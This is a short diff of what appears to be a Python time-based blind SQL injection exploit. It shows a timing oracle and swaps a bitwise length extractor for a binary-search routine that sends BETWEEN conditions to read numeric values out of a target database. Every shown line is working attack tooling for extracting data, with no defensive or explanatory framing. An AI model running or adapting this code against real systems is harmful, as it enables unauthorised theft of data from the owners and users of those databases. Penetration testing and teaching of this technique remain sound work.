@@ -15,12 +15,17 @@ def oracle(q):
     #print(time.time() - start)
     return time.time() - start > delay
 
-def dump_length(q):
-    length=0
-    for p in range(7):
-        if oracle(f"({q})&{2**p}>0"):
-            length |= 2**p
-    return length
+#Calculate the Length
+def dumpNumber(q):
+    low = 0
+    high = 127
+    while low <= high:
+        mid = (low+high) // 2
+        if oracle(f"({q}) BETWEEN {low} AND {mid}"):
+            high = mid -1
+        else:
+            low = mid + 1
+    return low
 
 def dump_string(q, length):
     var = ""
